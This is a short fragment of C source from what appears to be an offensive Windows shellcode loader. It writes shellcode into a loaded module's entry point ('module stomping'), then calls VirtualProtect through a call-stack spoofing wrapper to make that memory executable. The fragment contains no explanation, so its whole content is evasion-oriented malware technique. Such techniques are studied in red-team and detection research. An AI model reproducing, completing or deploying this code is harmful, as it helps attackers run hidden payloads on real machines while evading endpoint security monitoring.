    printf("    Shellcode written to entry point\n");

    // VirtualProtect to RX (spoofed)
    DWORD tmp = 0;
    memset(&call, 0, sizeof(call));
    call.ptr     = (PVOID)VirtualProtect;
    call.argc    = 4;
    call.args[0] = spoof_arg(ep);
    call.args[1] = spoof_arg(scSize);
    call.args[2] = spoof_arg(PAGE_EXECUTE_READ);
    call.args[3] = spoof_arg(&tmp);
    SpoofCall(&call);

    printf("[+] Module stomping complete\n\n");

